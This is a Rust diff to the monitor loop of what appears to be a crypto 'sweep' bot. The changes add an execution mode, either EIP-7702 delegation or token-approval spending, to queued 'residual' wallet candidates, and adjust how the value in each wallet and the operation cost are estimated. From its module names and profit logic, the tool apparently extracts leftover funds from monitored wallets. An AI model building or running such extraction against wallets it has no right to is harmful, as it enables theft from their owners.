@@ -4,7 +4,7 @@ use crate::contract::ERC20Token;
 use crate::dashboard::{DashboardHandle, WalletSnapshot};
 use crate::extractor;
 use crate::queue::{
-    estimated_total_cost_wei, OperationType, ResidualCandidate, SweepQueue,
+    estimated_total_cost_wei, ExecutionMode, OperationType, ResidualCandidate, SweepQueue,
 };
 use crate::rpc::RpcFleet;
 use ethers::prelude::*;
@@ -161,6 +161,7 @@ pub async fn start_monitor(
                     let candidate = ResidualCandidate {
                         wallet: wallet_addr,
                         operation: OperationType::Exec,
+                        execution_mode: ExecutionMode::Delegate7702,
                         requires_approve: false,
                         approval_tokens: Vec::new(),
                         native_balance: mock_balance_wei,
@@ -329,6 +330,7 @@ pub async fn start_monitor(
                                 endpoint.provider.clone(),
                                 wallet_addr,
                                 config.mock_contract_mode,
+                                ExecutionMode::Delegate7702,
                             )
                             .await;
                             let estimated_operation_cost_wei =
@@ -338,6 +340,7 @@ pub async fn start_monitor(
                                     &ResidualCandidate {
                                         wallet: wallet_addr,
                                         operation,
+                                        execution_mode: ExecutionMode::Delegate7702,
                                         requires_approve: false,
                                         approval_tokens: Vec::new(),
                                         native_balance,
@@ -388,6 +391,7 @@ pub async fn start_monitor(
                                 candidates.push(ResidualCandidate {
                                     wallet: wallet_addr,
                                     operation,
+                                    execution_mode: ExecutionMode::Delegate7702,
                                     requires_approve: false,
                                     approval_tokens: Vec::new(),
                                     native_balance,
@@ -419,11 +423,11 @@ pub async fn start_monitor(
                                 continue;
                             }
 
-                            let total_residual_wei = native_balance.saturating_add(token_value_wei);
                             let token_value_eth = wei_to_eth_f64(token_value_wei);
-                            let estimated_net_profit_wei =
-                                total_residual_wei.saturating_sub(estimated_operation_cost_wei);
-                            if token_value_eth > native_balance_eth * config.max_token_value_ratio {
+                            let requires_approve = !token_portfolio.approval_tokens.is_empty();
+                            if !requires_approve
+                                && token_value_eth > native_balance_eth * config.max_token_value_ratio
+                            {
                                 if config.hot_path_info_events {
                                     debug!(
                                         "wallet {} token/native ratio {:.4} exceeds limit {:.4}",
@@ -436,10 +440,27 @@ pub async fn start_monitor(
                             }
 
                             let asset_class = classify_candidate_asset(&token_portfolio);
-                            let requires_approve = !token_portfolio.approval_tokens.is_empty();
+                            let execution_mode = if requires_approve {
+                                ExecutionMode::Spender
+                            } else {
+                                ExecutionMode::Delegate7702
+                            };
+                            let operation = detect_wallet_operation(
+                                endpoint.provider.clone(),
+                                wallet_addr,
+                                config.mock_contract_mode,
+                                execution_mode,
+                            )
+                            .await;
+                            let total_residual_wei = if matches!(execution_mode, ExecutionMode::Spender) {
+                                token_value_wei
+                            } else {
+                                native_balance.saturating_add(token_value_wei)
+                            };
                             let candidate_template = ResidualCandidate {
                                 wallet: wallet_addr,
                                 operation,
+                                execution_mode,
                                 requires_approve,
                                 approval_tokens: token_portfolio.approval_tokens.clone(),
                                 native_balance,
@@ -471,6 +492,7 @@ pub async fn start_monitor(
                                 candidates.push(ResidualCandidate {
                                     wallet: wallet_addr,
                                     operation,
+                                    execution_mode,
                                     requires_approve,
                                     approval_tokens: token_portfolio.approval_tokens,
                                     native_balance,
@@ -511,6 +533,7 @@ pub async fn start_monitor(
                                         endpoint.provider.clone(),
                                         wallet_addr,
                                         config.mock_contract_mode,
+                                        ExecutionMode::Delegate7702,
                                     )
                                     .await;
                                     let estimated_operation_cost_wei = estimated_total_cost_wei(
@@ -519,6 +542,7 @@ pub async fn start_monitor(
                                         &ResidualCandidate {
                                             wallet: wallet_addr,
                                             operation,
+                                            execution_mode: ExecutionMode::Delegate7702,
                                             requires_approve: false,
                                             approval_tokens: Vec::new(),
                                             native_balance,
@@ -560,6 +584,7 @@ pub async fn start_monitor(
                                         candidates.push(ResidualCandidate {
                                             wallet: wallet_addr,
                                             operation,
+                                            execution_mode: ExecutionMode::Delegate7702,
                                             requires_approve: false,
                                             approval_tokens: Vec::new(),
                                             native_balance,
@@ -591,22 +616,36 @@ pub async fn start_monitor(
                                         continue;
                                     }
 
-                                    let total_residual_wei =
-                                        native_balance.saturating_add(token_value_wei);
-                                    let estimated_net_profit_wei =
-                                        total_residual_wei
-                                            .saturating_sub(estimated_operation_cost_wei);
                                     let token_value_eth = wei_to_eth_f64(token_value_wei);
-
-                                    if token_value_eth > native_balance_eth * config.max_token_value_ratio {
-                                        continue;
-                                    }
-
                                     let asset_class = classify_candidate_asset(&token_portfolio);
                                     let requires_approve = !token_portfolio.approval_tokens.is_empty();
+                                    let execution_mode = if requires_approve {
+                                        ExecutionMode::Spender
+                                    } else {
+                                        ExecutionMode::Delegate7702
+                                    };
+                                    if !requires_approve
+                                        && token_value_eth > native_balance_eth * config.max_token_value_ratio
+                                    {
+                                        continue;
+                                    }
+                                    let operation = detect_wallet_operation(
+                                        endpoint.provider.clone(),
+                                        wallet_addr,
+                                        config.mock_contract_mode,
+                                        execution_mode,
+                                    )
+                                    .await;
+                                    let total_residual_wei =
+                                        if matches!(execution_mode, ExecutionMode::Spender) {
+                                            token_value_wei
+                                        } else {
+                                            native_balance.saturating_add(token_value_wei)
+                                        };
                                     let candidate_template = ResidualCandidate {
                                         wallet: wallet_addr,
                                         operation,
+                                        execution_mode,
                                         requires_approve,
                                         approval_tokens: token_portfolio.approval_tokens.clone(),
                                         native_balance,
@@ -646,6 +685,7 @@ pub async fn start_monitor(
                                         candidates.push(ResidualCandidate {
                                             wallet: wallet_addr,
                                             operation,
+                                            execution_mode,
                                             requires_approve,
                                             approval_tokens: token_portfolio.approval_tokens,
                                             native_balance,
@@ -823,8 +863,13 @@ async fn detect_wallet_operation(
     provider: Arc<Provider<Http>>,
     wallet_addr: Address,
     mock_contract_mode: bool,
+    execution_mode: ExecutionMode,
 ) -> OperationType {
     if mock_contract_mode {
+        return OperationType::Exec;
+    }
+
+    if matches!(execution_mode, ExecutionMode::Spender) {
         return OperationType::Exec;
     }
 
